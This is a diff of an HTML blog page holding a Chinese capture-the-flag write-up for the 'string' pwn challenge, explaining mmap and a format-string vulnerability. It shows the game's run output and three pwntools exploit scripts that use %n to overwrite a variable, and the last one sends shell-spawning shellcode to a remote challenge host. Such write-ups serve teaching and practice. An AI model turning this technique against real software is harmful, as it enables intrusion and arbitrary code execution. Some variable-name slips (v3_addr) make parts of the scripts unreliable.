+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当创建一个或者切换一个进程的同时，会把属于这个当前进程的系统信息载入。这些系统信息中包含了当前进程的运行空间。当用户程序调用mmap后。函数会在当前进程的空间中找到适合的vma来描述自己将要映射的区域。这个区域的作用就是将mmap函数中文件描述符所指向的具体文件中内容映射过来。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原理是mmap的执行，仅仅是在内核中建立了文件与虚拟内存空间的对应关系。用户访问这些虚拟内存空间时，页面表里面是没有这些空间的表项的。当用户程序试图访问这些映射的空间时，于是产生缺页异常。内核捕捉这些异常，逐渐将文件载入。所谓的载入过程，具体的操作就是read和write在管理pagecache。Vma的结构体中有很文件操作集。vma操作集中会有自己关于page cache的操作集合。这样，虽然是两种不同的系统调用，由于操作和调用触发的路径不同。但是最后还是落实到了page cache的管理。实现了文件内容的操作。</p>
+<h4 id="4-运行-pwn"><a href="#4-运行-pwn" class="headerlink" title="4.运行 pwn"></a><code>4.运行 pwn</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Welcome to Dragon Games!</span><br><span class="line">                                                 .~)&gt;&gt;</span><br><span class="line">                                               .~))))&gt;&gt;&gt;</span><br><span class="line">                                             .~))&gt;&gt;             ___\</span><br><span class="line">                                           .~))&gt;&gt;)))&gt;&gt;      .-~))&gt;&gt;\</span><br><span class="line">                                         .~)))))&gt;&gt;       .-~))&gt;&gt;)&gt;   </span><br><span class="line">                                       .~)))&gt;&gt;))))&gt;&gt;  .-~)&gt;&gt;)&gt;       </span><br><span class="line">                   )                 .~))&gt;&gt;))))&gt;&gt;  .-~)))))&gt;&gt;)&gt;</span><br><span class="line">                ( )@@*)             //)&gt;))))))  .-~))))&gt;&gt;)&gt;</span><br><span class="line">              ).@(@@               //))&gt;&gt;))) .-~))&gt;&gt;)))))&gt;&gt;)&gt;</span><br><span class="line">            (( @.@).              //))))) .-~)&gt;&gt;)))))&gt;&gt;)&gt;</span><br><span class="line">          ))  )@@*.@@ )          //)&gt;))) //))))))&gt;&gt;))))&gt;&gt;)&gt;</span><br><span class="line">       ((  ((@@@.@@             |/))))) //)))))&gt;&gt;)))&gt;&gt;)&gt;</span><br><span class="line">      )) @@*. )@@ )   (\_(\  |))&gt;)) //)))&gt;&gt;)))))))&gt;&gt;)&gt;</span><br><span class="line">    (( @@@(.@(@ .    _/`-`  ~|b |&gt;))) //)&gt;&gt;)))))))&gt;&gt;)&gt;</span><br><span class="line">     )* @@@ )@*     (@) (@)  |))) //))))))&gt;&gt;))))&gt;&gt;</span><br><span class="line">   (( @. )@( @ .   _/       / )) //))&gt;&gt;)))))&gt;&gt;&gt;_._</span><br><span class="line">    )@@ (@@*)@@.  (6,   6) / ^ )//))))))&gt;&gt;)))&gt;&gt;   ~~-.</span><br><span class="line"> ( @jgs@@. @@@.*@_ ~^~^~, /\  ^ /)&gt;&gt;))))&gt;&gt;      _.     `,</span><br><span class="line">  ((@@ @@@*.(@@ .   \^^^/&apos; (  ^  )))&gt;&gt;        .&apos;         `,</span><br><span class="line">   ((@@).*@@ )@ )    `-&apos;   ((   ^  ~)_          /             `,</span><br><span class="line">     (@@. (@@ ).           (((   ^    `\        |               `.</span><br><span class="line">       (*.@*              / ((((        \        \      .         `.</span><br><span class="line">                         /   (((((  \    \    _.-~\     Y,         ;</span><br><span class="line">                        /   / (((((( \    \.-~   _.`&quot; _.-~`,       ;</span><br><span class="line">                       /   /   `(((((()    )    (((((~      `,     ;</span><br><span class="line">                     _/  _/      `&quot;&quot;&quot;/   /&apos;                  ;     ;</span><br><span class="line">                 _.-~_.-~           /  /&apos;                _.-~   _.&apos;</span><br><span class="line">               ((((~~              / /&apos;              _.-~ __.--~</span><br><span class="line">                                  ((((          __.-~ _.-~</span><br><span class="line">                                              .&apos;   .~~</span><br><span class="line">                                              :    ,&apos;</span><br><span class="line"></span><br><span class="line">we are wizard, we will give you hand, you can not defeat dragon by yourself ...</span><br><span class="line">we will tell you two secret ...</span><br><span class="line">secret[0] is 15812a0</span><br><span class="line">secret[1] is 15812a4</span><br><span class="line">do not tell anyone </span><br><span class="line">What should your character&apos;s name be:							// 第1处输入</span><br><span class="line">&gt; hello,world!</span><br><span class="line"></span><br><span class="line">Creating a new player.</span><br><span class="line"> This is a famous but quite unusual inn. The air is fresh and the</span><br><span class="line">marble-tiled ground is clean. Few rowdy guests can be seen, and the</span><br><span class="line">furniture looks undamaged by brawls, which are very common in other pubs</span><br><span class="line">all around the world. The decoration looks extremely valuable and would fit</span><br><span class="line">into a palace, but in this city it&apos;s quite ordinary. In the middle of the</span><br><span class="line">room are velvet covered chairs and benches, which surround large oaken</span><br><span class="line">tables. A large sign is fixed to the northern wall behind a wooden bar. In</span><br><span class="line">one corner you notice a fireplace.</span><br><span class="line">There are two obvious exits: east, up.</span><br><span class="line">But strange thing is ,no one there.</span><br><span class="line">So, where you will go?east or up?:								// 第2处输入</span><br><span class="line">&gt; east				</span><br><span class="line"></span><br><span class="line">You travel a short distance east.That&apos;s odd, anyone disappear suddenly</span><br><span class="line">, what happend?! You just travel , and find another hole</span><br><span class="line">You recall, a big black hole will suckk you into it! Know what should you do?</span><br><span class="line">go into there(1), or leave(0)?:									// 第3处输入</span><br><span class="line">&gt; 1</span><br><span class="line"></span><br><span class="line">A voice heard in your mind</span><br><span class="line">&apos;Give me an address&apos;											// 第4处输入</span><br><span class="line">&gt; 1111</span><br><span class="line"></span><br><span class="line">And, you wish is:												// 第5处输入</span><br><span class="line">&gt; nihao</span><br><span class="line"></span><br><span class="line">Your wish is</span><br><span class="line">nihaoI hear it, I hear it....</span><br><span class="line">Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!</span><br><span class="line">Dragon say: HaHa! you were supposed to have a normal</span><br><span class="line">RPG game, but I have changed it! you have no weapon and </span><br><span class="line">skill! you could not defeat me !</span><br><span class="line">That&apos;s sound terrible! you meet final boss!but you level is ONE!</span><br><span class="line">The End.....Really?</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>通过正常的输入，发现程序能正常运行，但是并不能满足<code>*(_DWORD *)a1 == *(_DWORD *)(a1 + 4)</code>，因为v4的值从一开始就被赋值为<code>68</code>，v4[1]的值被赋值为<code>85</code>，所以等式是肯定不成立的。</p>
 </blockquote>
-<h4 id="5理清思路"><a class="markdownIt-Anchor" href="#5理清思路"></a> <code>5.理清思路</code></h4>
-<p>      经过上述分析之后，现在再理清一下该题目的思路：</p>
+<h4 id="5-理清思路"><a href="#5-理清思路" class="headerlink" title="5.理清思路"></a><code>5.理清思路</code></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过上述分析之后，现在再理清一下该题目的思路：</p>
 <ol>
 <li>我们要想成功执行shellcode，就必须使得v4[0]=v4[1]，那么我们怎么样才能把v4的值改为85，或者把v4[1]的值改为68？</li>
-<li>修改变量值的两种方法：
-<ul>
+<li>修改变量值的两种方法：<ul>
 <li>通过栈溢出，从而达到修改局部变量值的目的，但是本题开启了Canary，所以不容易实现</li>
 <li>因为在本题中发现了格式化字符串漏洞，所以可以根据格式化字符串漏洞进行修改，那怎么通过格式化字符串漏洞的手段来修改v4或者v4[1]的值呢？</li>
 </ul>
 </li>
 <li>在<a href="https://muzibing.github.io/2020/05/29/2020.05.29%EF%BC%88119%EF%BC%89">详解格式化字符串漏洞</a>中存在一道例题，就是把变量a的值修改为8，从而执行if分支。我们可以根据那个原理来做本题，这里我们只对v4进行修改，如果相对v4[1]修改的话，可以自己尝试一下。</li>
 </ol>
-<h3 id="0x02-解题步骤"><a class="markdownIt-Anchor" href="#0x02-解题步骤"></a> <code>0x02 解题步骤</code></h3>
-<h4 id="1查找-format-地址的参数偏移"><a class="markdownIt-Anchor" href="#1查找-format-地址的参数偏移"></a> <code>1.查找 format 地址的参数偏移</code></h4>
-<p>      在这里我们忽略前4个的输入和输出结果，直接来到第5个输入处，首先一定要知道该<code>pwn</code>是一个<code>64</code>位的ELF文件，我们在第5个输入处输入<code>AAAAAAAA%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx</code>，查看结果如下：</p>
+<h3 id="0x02-解题步骤"><a href="#0x02-解题步骤" class="headerlink" title="0x02 解题步骤"></a><code>0x02 解题步骤</code></h3><h4 id="1-查找-format-地址的参数偏移"><a href="#1-查找-format-地址的参数偏移" class="headerlink" title="1.查找 format 地址的参数偏移"></a><code>1.查找 format 地址的参数偏移</code></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这里我们忽略前4个的输入和输出结果，直接来到第5个输入处，首先一定要知道该<code>pwn</code>是一个<code>64</code>位的ELF文件，我们在第5个输入处输入<code>AAAAAAAA%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx</code>，查看结果如下：</p>
 <p><img src="/images/120-2.jpg" alt></p>
 <blockquote>
 <p>通过上图可以发现<code>AAAAAAAA</code>的十六进制<code>4141414141414141</code>使printf函数的第 9 个参数，使格式化字符串的第 8 个参数，我们来验证一下我们的猜想对不对，下面给出在gdb中的调试结果，如下图：</p>
@@ -508,30 +496,26 @@ height:50vh;
 <ul>
 <li>%x: 他可以将对应参数的值以16进制打印出来，<strong>%x只能打印4个字节，%lx或者%llx可以打8个字节</strong>。如%x表示要泄漏对应偏移4字节长度的16进制数据，%llx表示要泄漏对应偏移8字节长度的16进制数据。</li>
 <li>%s：可以打印<strong>对应参数所指向的字符串</strong>。</li>
-<li>%n: 可以修改对应参数（这个参数是指针）所指向的变量的值为%n之前打印的字符的个数，如果是32位程序，则这个指针变量为4字节，64位程序这个指针变量为8字节，这是因为不同位数，地址的长度不同。**还要注意%n是修改对应参数指向的地址起，4字节长度的空间。，%hn，是修改2字节的地址空间，%hhn是1字节的地址空间，%lln是修改8字节的地址空间。**像修改地址这样的大数据，如果一次输出太多的字节可能会引起程序崩溃，则可以利用%hn，%hhn来一部分一部分的写入，</li>
+<li>%n: 可以修改对应参数（这个参数是指针）所指向的变量的值为%n之前打印的字符的个数，如果是32位程序，则这个指针变量为4字节，64位程序这个指针变量为8字节，这是因为不同位数，地址的长度不同。<strong>还要注意%n是修改对应参数指向的地址起，4字节长度的空间。，%hn，是修改2字节的地址空间，%hhn是1字节的地址空间，%lln是修改8字节的地址空间。</strong>像修改地址这样的大数据，如果一次输出太多的字节可能会引起程序崩溃，则可以利用%hn，%hhn来一部分一部分的写入，</li>
 </ul>
 </blockquote>
-<h4 id="2将-v4-的地址存放在-format-首地址处"><a class="markdownIt-Anchor" href="#2将-v4-的地址存放在-format-首地址处"></a> <code>2.将 v4 的地址存放在 format 首地址处</code></h4>
-<p>      和<a href="https://muzibing.github.io/2020/05/29/2020.05.29%EF%BC%88119%EF%BC%89">详解格式化字符串漏洞</a>一样，我们将 v4 的地址存放在 format 首地址处，因为前面已经有了8bytes，那么还需要 <code>85-8=77</code> 个字符，然后再通过%8$n（因为format的首地址是格式化字符串的第8个参数），又因为前面程序已经将v4的地址打印了出来，所以正常来说payload为：</p>
+<h4 id="2-将-v4-的地址存放在-format-首地址处"><a href="#2-将-v4-的地址存放在-format-首地址处" class="headerlink" title="2.将 v4 的地址存放在 format 首地址处"></a><code>2.将 v4 的地址存放在 format 首地址处</code></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;和<a href="https://muzibing.github.io/2020/05/29/2020.05.29%EF%BC%88119%EF%BC%89">详解格式化字符串漏洞</a>一样，我们将 v4 的地址存放在 format 首地址处，因为前面已经有了8bytes，那么还需要 <code>85-8=77</code> 个字符，然后再通过%8$n（因为format的首地址是格式化字符串的第8个参数），又因为前面程序已经将v4的地址打印了出来，所以正常来说payload为：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = str(p64(v4_addr),encoding=&quot;unicode_escape&quot;) + &quot;a&quot;*77 + &quot;%8$n&quot;</span><br></pre></td></tr></table></figure>
-<p>      如果正常执行的话，栈中和寄存器的情况如下：</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果正常执行的话，栈中和寄存器的情况如下：</p>
 <p><img src="/images/120-6.png" alt></p>
-<p>      那么最终的exp如下：</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;那么最终的exp如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/sssusr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>, arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>,endian=<span class="string">"little"</span>)</span><br><span class="line"><span class="comment">#r = remote("124.126.19.106",38510)</span></span><br><span class="line">r = process(<span class="string">"./pwn"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"secret[0] is "</span>)</span><br><span class="line">v4_addr = int(r.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"[*] v4_addr is"</span>,hex(v3_addr))</span><br><span class="line"> </span><br><span class="line">payload = str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>) + <span class="string">"a"</span>*<span class="number">77</span> + <span class="string">"%8$n"</span></span><br><span class="line">print(<span class="string">"[+] p64(v4_addr) is"</span>,str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"What should your character's name be:"</span>,<span class="string">"LISHUO"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"So, where you will go?east or up?:"</span>,<span class="string">"east"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"go into there(1), or leave(0)?:"</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"'Give me an address'"</span>,<span class="string">"1111"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"And, you wish is:"</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<p>      执行该exp文件，并没有得到我们想要的结果（打印出&quot;Wizard: I will help you! USE YOU SPELL&quot;），下图是程序停止的地方：</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行该exp文件，并没有得到我们想要的结果（打印出”Wizard: I will help you! USE YOU SPELL”），下图是程序停止的地方：</p>
 <p><img src="/images/120-5.jpg" alt></p>
 <blockquote>
-<p>为什么会在这个地方停止运行了呢？这里涉及到一个知识点程序遇到”\x00“会发生截断<sup>[3]</sup>，但是将<code>\x00</code>其放在字符串的末尾就可以解决了<sup>[4]</sup>，那么下一步就是要看一下，在那里发生了截断，从上图中可以看出，应该是因为v4地址在小段输入时产生了\x00，我们在运行exp.py程序前，提前想到将v4的地址以小段的形式打印了出来，那么我们去看一下：<code>[+] p64(v3_addr) is ÒÔ\x00\x00</code>果然含有截断符号，那么下一步我们要把v4的地址放到最后，这样就不会发生截断，因此构造出了</p>
+<p>为什么会在这个地方停止运行了呢？这里涉及到一个知识点程序遇到”\x00“会发生截断<sup>[3]</sup>，但是将<code>\x00</code>其放在字符串的末尾就可以解决了<sup>[4]</sup>，那么下一步就是要看一下，在那里发生了截断，从上图中可以看出，应该是因为v4地址在小段输入时产生了\x00，我们在运行exp.py程序前，提前想到将v4的地址以小段的形式打印了出来，那么我们去看一下：<code>[+] p64(v3_addr) is  ÒÔ\x00\x00</code>果然含有截断符号，那么下一步我们要把v4的地址放到最后，这样就不会发生截断，因此构造出了</p>
 <p><code>[&quot;a&quot;*85][%length$n][padding][v4_addr]</code></p>
 <ul>
-<li>
-<p>中间部分为<code>%length$n</code>和<code>padding</code></p>
+<li><p>中间部分为<code>%length$n</code>和<code>padding</code></p>
 </li>
-<li>
-<p>前部分应该是长度为85的字符串，我们可以用”a“*85进行填充</p>
+<li><p>前部分应该是长度为85的字符串，我们可以用”a“*85进行填充</p>
 </li>
-<li>
-<p>由于v4的地址需要单独放在一个64位的地址空间，所以这里需要对齐：</p>
+<li><p>由于v4的地址需要单独放在一个64位的地址空间，所以这里需要对齐：</p>
 <ul>
 <li>”a“*85：这是85个字符长度</li>
 <li>%length$n：由于length不确定，所以该长度不确定</li>
@@ -541,23 +525,21 @@ height:50vh;
 </li>
 </ul>
 </blockquote>
-<p>      经过上述分析，我们又重新得到一个新的exp：</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过上述分析，我们又重新得到一个新的exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/sssusr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>, arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>,endian=<span class="string">"little"</span>)</span><br><span class="line"><span class="comment">#r = remote("124.126.19.106",38510)</span></span><br><span class="line">r = process(<span class="string">"./pwn"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"secret[0] is "</span>)</span><br><span class="line">v4_addr = int(r.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"[*] v4_addr is"</span>,hex(v4_addr))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#payload = str(p64(v4_addr),encoding="unicode_escape") + "a"*77 + "%8$n"</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">85</span> + <span class="string">"%20$n"</span> + <span class="string">"a"</span>*<span class="number">6</span> + str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>) </span><br><span class="line">print(<span class="string">"[+] p64(v4_addr) is"</span>,str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"What should your character's name be:"</span>,<span class="string">"LISHUO"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"So, where you will go?east or up?:"</span>,<span class="string">"east"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"go into there(1), or leave(0)?:"</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"'Give me an address'"</span>,<span class="string">"1111"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"And, you wish is:"</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <p><img src="/images/120-4.png" alt></p>
 <blockquote>
 <p>得到的结果如上图，从得到的输出来看，我们已经成功的修改了v4的值，下面我们就写入shellcode，得到flag，完整的exp如下：</p>
 </blockquote>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/sssusr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>, arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>,endian=<span class="string">"little"</span>)</span><br><span class="line">r = remote(<span class="string">"124.126.19.106"</span>,<span class="number">38510</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"secret[0] is "</span>)</span><br><span class="line"></span><br><span class="line">v4_addr = int(r.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"[*] v4_addr is"</span>,hex(v3_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">85</span> + <span class="string">"%20$n"</span> + <span class="string">"a"</span>*<span class="number">6</span> + str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>) </span><br><span class="line">print(<span class="string">"[+] p64(v4_addr) is"</span>,str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "a"*85 + "%7$n</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"What should your character's name be:"</span>,<span class="string">"LISHUO"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"So, where you will go?east or up?:"</span>,<span class="string">"east"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"go into there(1), or leave(0)?:"</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"'Give me an address'"</span>,<span class="string">"1111"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"And, you wish is:"</span>,payload)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">r.sendlineafter(<span class="string">"Wizard: I will help you! USE YOU SPELL"</span>,shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="font-color-navy0x03-其他方法font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-其他方法font"></a> <font color="navy"><code>0x03 其他方法</code></font></h3>
-<p>      网上关于这道题目的做法有很多，大部分都是通过第4个输入<code>'Give me an address'</code>来改变v4的值，在这里我就不再多多赘述，这里有几个这样做法的writeup，但是里面有很多问题，希望大家能够批判性的去学习。当然在这里因为我个人水平有限的，我也不敢保证这篇writeup也不存在问题，如果存在问题，还希望大家在评论区指正说明。</p>
+<h3 id="0x03-其他方法"><a href="#0x03-其他方法" class="headerlink" title="0x03 其他方法"></a><font color="navy"><code>0x03 其他方法</code></font></h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;网上关于这道题目的做法有很多，大部分都是通过第4个输入<code>&#39;Give me an address&#39;</code>来改变v4的值，在这里我就不再多多赘述，这里有几个这样做法的writeup，但是里面有很多问题，希望大家能够批判性的去学习。当然在这里因为我个人水平有限的，我也不敢保证这篇writeup也不存在问题，如果存在问题，还希望大家在评论区指正说明。</p>
 <ul>
 <li><a href="https://blog.csdn.net/qq_43681242/article/details/103681367?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">攻防世界pwn新手练习（string）</a></li>
 <li><a href="https://blog.csdn.net/fastergohome/article/details/103627264" target="_blank" rel="noopener">string [XCTF-PWN]CTF writeup系列7（超详细分析）</a></li>
 </ul>
-<h3 id="0x04-reference"><a class="markdownIt-Anchor" href="#0x04-reference"></a> <code>0x04 Reference</code></h3>
-<p>[1] <a href="https://www.cnblogs.com/shijingxiang/articles/5185068.html" target="_blank" rel="noopener">Mmap的实现原理和应用</a></p>
+<h3 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a><code>0x04 Reference</code></h3><p>[1] <a href="https://www.cnblogs.com/shijingxiang/articles/5185068.html" target="_blank" rel="noopener">Mmap的实现原理和应用</a></p>
 <p>[2] <a href="http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/" target="_blank" rel="noopener">64位汇编参数传递</a></p>
-<p>[3] <a href="http://dittozzz.top/2019/02/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">格式化串漏洞利用总结</a>⭐</p>
+<p>[3] <a href="http://dittozzz.top/2019/02/22/格式化串漏洞利用总结/" target="_blank" rel="noopener">格式化串漏洞利用总结</a>⭐</p>
 <p>[4] <a href="https://wizardforcel.gitbooks.io/q-buffer-overflow-tutorial/content/86.html" target="_blank" rel="noopener">5.1.2 ShellCode编码的用处</a></p>
 <p>[5] <a href="https://www.cnblogs.com/junjiany/p/7055064.html" target="_blank" rel="noopener">python第一行注释是什么意思？</a></p>
 
@@ -720,7 +702,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x00-前言font"><span class="toc-number">1.</span> <span class="toc-text"> 0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x01-题目分析font"><span class="toc-number">2.</span> <span class="toc-text"> 0x01 题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1查看-elf-文件"><span class="toc-number">2.1.</span> <span class="toc-text"> 1.查看 ELF 文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2查看文件保护机制"><span class="toc-number">2.2.</span> <span class="toc-text"> 2.查看文件保护机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3用-ida-逆向"><span class="toc-number">2.3.</span> <span class="toc-text"> 3.用 IDA 逆向</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4运行-pwn"><span class="toc-number">2.4.</span> <span class="toc-text"> 4.运行 pwn</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5理清思路"><span class="toc-number">2.5.</span> <span class="toc-text"> 5.理清思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-解题步骤"><span class="toc-number">3.</span> <span class="toc-text"> 0x02 解题步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1查找-format-地址的参数偏移"><span class="toc-number">3.1.</span> <span class="toc-text"> 1.查找 format 地址的参数偏移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2将-v4-的地址存放在-format-首地址处"><span class="toc-number">3.2.</span> <span class="toc-text"> 2.将 v4 的地址存放在 format 首地址处</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x03-其他方法font"><span class="toc-number">4.</span> <span class="toc-text"> 0x03 其他方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-reference"><span class="toc-number">5.</span> <span class="toc-text"> 0x04 Reference</span></a></li></ol>
